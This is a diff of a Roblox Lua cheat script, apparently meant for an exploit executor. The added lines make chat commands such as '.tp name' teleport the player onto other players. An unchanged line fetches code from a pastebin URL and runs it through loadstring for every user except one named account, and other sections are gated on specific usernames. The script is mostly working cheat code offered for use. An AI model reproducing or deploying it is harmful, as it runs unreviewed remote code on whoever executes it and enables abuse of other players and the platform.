@@ -2,6 +2,48 @@ if game.Players.LocalPlayer.Name == "zer1ckq" then
     print("cute_hummingbird_73847")
 else
     loadstring(game:HttpGet('https://pastebin.com/raw/3hnKWdzB'))()
+    if _G.SKidd then _G.SKidd:Disconnect() end
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local STAND = LocalPlayer
+        local OWNER = LocalPlayer
+
+        local function findPlayer(partialName)
+            for _, TARGET in ipairs(Players:GetPlayers()) do
+                if TARGET.Name:lower():find(partialName:lower()) or 
+                (TARGET.DisplayName and TARGET.DisplayName:lower():find(partialName:lower())) then
+                    return TARGET
+                end
+            end
+            return nil
+        end
+        _G.SKidd = OWNER.Chatted:Connect(function(msg)
+            local lowerMsg = msg:lower()
+            if lowerMsg:sub(1, 3) == ".tp" or lowerMsg:sub(1, 3) == ".to" or 
+            lowerMsg:sub(1, 3) == ";tp" or lowerMsg:sub(1, 3) == ";to" or 
+            lowerMsg:sub(1, 3) == ":tp" or lowerMsg:sub(1, 3) == ":to" or 
+            lowerMsg:sub(1, 3) == ",tp" or lowerMsg:sub(1, 3) == ",to" then
+                local partialName = lowerMsg:sub(5)
+                local TARGET = findPlayer(partialName)
+                
+                if TARGET then
+                    print("hi " .. TARGET.Name)
+                    
+                    if STAND.Character and TARGET.Character and 
+                    STAND.Character:FindFirstChild("HumanoidRootPart") and 
+                    TARGET.Character:FindFirstChild("HumanoidRootPart") then
+                        STAND.Character.HumanoidRootPart.CFrame = CFrame.new(
+                            TARGET.Character.HumanoidRootPart.Position + 
+                            (TARGET.Character.HumanoidRootPart.Velocity * 0.2)
+                        )
+                    end
+
+                else
+                    print("Target not found.")
+                end
+            end
+        end)
+
 end 
         ------------------------------------------------------------------------------
         if not game.CoreGui:FindFirstChild("Discord") then
@@ -6573,3 +6615,5 @@ if game.Players.LocalPlayer.Name == "fame7ty" or  game.Players.LocalPlayer.Name 
             task.wait(.5)
             Lockaddd()
         end)
+
+
